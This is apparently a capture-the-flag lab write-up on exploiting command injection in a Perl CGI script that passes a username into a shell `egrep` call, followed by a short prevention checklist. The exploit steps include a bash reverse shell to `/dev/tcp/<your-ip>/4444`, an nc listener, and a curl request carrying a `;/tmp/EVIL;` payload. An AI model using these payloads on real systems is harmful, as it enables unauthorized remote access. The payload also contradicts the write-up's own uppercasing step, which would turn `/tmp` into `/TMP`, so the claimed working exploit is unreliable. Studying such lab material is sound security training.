
---
### 🛰️ Challenge Summary

> A Perl CGI script listens on port `1616` and receives `username` and `password` via HTTP GET parameters. Internally, it uses the `username` in a system-level `egrep` call.
> 
> The catch? Improper input validation opens a **command injection vulnerability**.

**Login:** `level16 : level16`  
**Target Service:** `http://<ip>:1616/index.cgi?username=<input>&password=<input>`  
**Goal:** Execute commands as `flag16` and retrieve the flag.

---

### 🧾 Vulnerability Profile

#### 📂 Source Behavior

The Perl script does the following:

1. Extracts `username` from the query string.
    
2. Converts it to uppercase.
    
3. Truncates after the first whitespace.
    
4. Passes the result into a backticked shell command:
    

```perl
@output = `egrep "^$username" /home/flag16/userdb.txt 2>&1`;
```

#### ⚠️ Why It's Dangerous

- **Backticks** in Perl (` `` `) invoke the shell.
    
- No input escaping means special characters (`;`, `\``,` &&`) are interpreted.
    
- The uppercase conversion **does not prevent command injection**, especially when wildcards and scripts are used.
    

---

### 🔓 Exploitation Blueprint

We inject a malicious shell command using metacharacters, leveraging wildcard expansion and an uppercased filename to evade filters.

---

### 🛠️ Practical Exploit Steps

#### 🧱 Step 1: Create a Payload Script

```bash
echo 'bash -i >& /dev/tcp/<your-ip>/4444 0>&1' > /tmp/EVIL
chmod +x /tmp/EVIL
```

✅ Make sure the filename is **uppercase** to survive the Perl script’s transformation.

#### 📡 Step 2: Prepare Listener

On your local machine:

```bash
nc -lvnp 4444
```

#### 🌐 Step 3: Craft the Injection Payload

**Injected Command:**

```bash
;/tmp/EVIL;
```

**URL-encoded:**

```
%3B%2Ftmp%2FEVIL%3B
```

#### 🛰️ Step 4: Send the Exploit Request

```bash
curl "http://<nebula-ip>:1616/index.cgi?username=%3B%2Ftmp%2FEVIL%3B&password=test"
```

The script runs `egrep`, but due to our injection, `/tmp/EVIL` is executed instead.

---

### 🏁 Getting the Flag

Once your listener receives the connection:

```bash
whoami
# flag16

getflag
# You have successfully executed getflag on a target account
```

---

### 🧹 Post-Exploitation Cleanup

Remove the injected script to avoid leaving traces:

```bash
rm /tmp/EVIL
```

---

### 🔒 Final Reflections

This level exemplifies how **shell metacharacters combined with weak input handling** can yield arbitrary code execution—even when basic sanitization is attempted.

#### 🧷 Prevention Checklist

- Avoid backticks—use safe APIs (e.g., Perl’s `open()` with list form).
    
- Validate and sanitize input aggressively.
    
- Don’t rely solely on character transformations (like uppercasing) for security.
    

---
